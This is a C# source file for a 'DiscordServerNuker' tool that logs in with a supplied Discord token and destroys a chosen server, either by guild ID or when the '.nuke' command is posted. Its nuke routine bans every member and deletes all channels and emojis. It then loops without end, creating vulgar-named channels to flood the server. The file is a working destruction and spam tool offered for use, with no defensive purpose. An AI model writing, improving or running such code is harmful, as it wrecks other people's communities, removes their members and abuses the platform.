using Discord;
using Discord.Gateway;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.Linq;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace DiscordServerNuker
{
    class Program
    {
        static void Main(string[] args)
        {
            DiscordSocketClient client = new DiscordSocketClient();

            Console.Write(" token : "); string token = Console.ReadLine();

            client.Login(token);

            client.OnLoggedIn += Client_OnLoggedIn;

            Thread.Sleep(-1);
        }


        private static void Client_OnLoggedIn(DiscordSocketClient client, LoginEventArgs args)
        {
            Console.Write(" 1 > Listen for the command .nuke");
            Console.WriteLine(" ");
            Console.Write(" 2 > Nuke a Guild by ID");

            Console.WriteLine(" ");

            Console.Write(" ~ ");

            string option = Console.ReadLine();

            if(option == "1")
            {
                client.OnMessageReceived += Client_OnMessageReceived;
            }
            else
            {
                Console.Clear();
                Console.Write(" Guild (ID) : "); string gid = Console.ReadLine(); ulong guildID = Convert.ToUInt64(gid);

                nuke(guildID, client);
            }

        }

        private static void Client_OnMessageReceived(DiscordSocketClient client, MessageEventArgs args)
        {
            if(args.Message.Content == ".nuke")
            {
                ulong ye = Convert.ToUInt64(args.Message.Guild.Id);
                nuke(ye, client);
            }
        }

        public static void nuke(ulong guild, DiscordSocketClient client)
        {
            Console.Write($" Are you sure you want to nuke {client.GetGuild(guild).Name} [y/n] ");
            string yoo = Console.ReadLine();

            if(yoo == "y")
            {
                foreach(var member in client.GetGuildMembers(guild))
                {
                    try
                    {
                        member.Ban();
                        Console.WriteLine($" > banned {member.User.Username}");
                    }
                    catch
                    {
                        Console.WriteLine($" > error while banning {member.User.Username}"); 
                    }
                }

                foreach(var channels in client.GetGuildChannels(guild))
                {
                    try
                    {
                        channels.Delete();
                        Console.WriteLine($" > Channel {channels.Name} Deleted");
                    }
                    catch{
                        Console.WriteLine($" > error while deleting {channels.Name}");
                    }

                }
                foreach(var emote in client.GetGuildEmojis(guild))
                {
                    try
                    {
                        emote.Delete();
                        Console.WriteLine($" > Emote {emote.Name} Deleted");
                    }
                    catch {

                        Console.WriteLine($" > Error while deleting {emote.Name}");

                    }


                }
                Thread.Sleep(69);

                Task.Run(() =>
                {
                    while (true)
                    {
                        try
                        {
                            client.CreateGuildChannel(guild, "cock and bal torture", ChannelType.Text);
                        }
                        catch 
                        {
                        }
                    }
                });



            }
            else
            {
                Environment.Exit(0);
            }
        }
    }
}
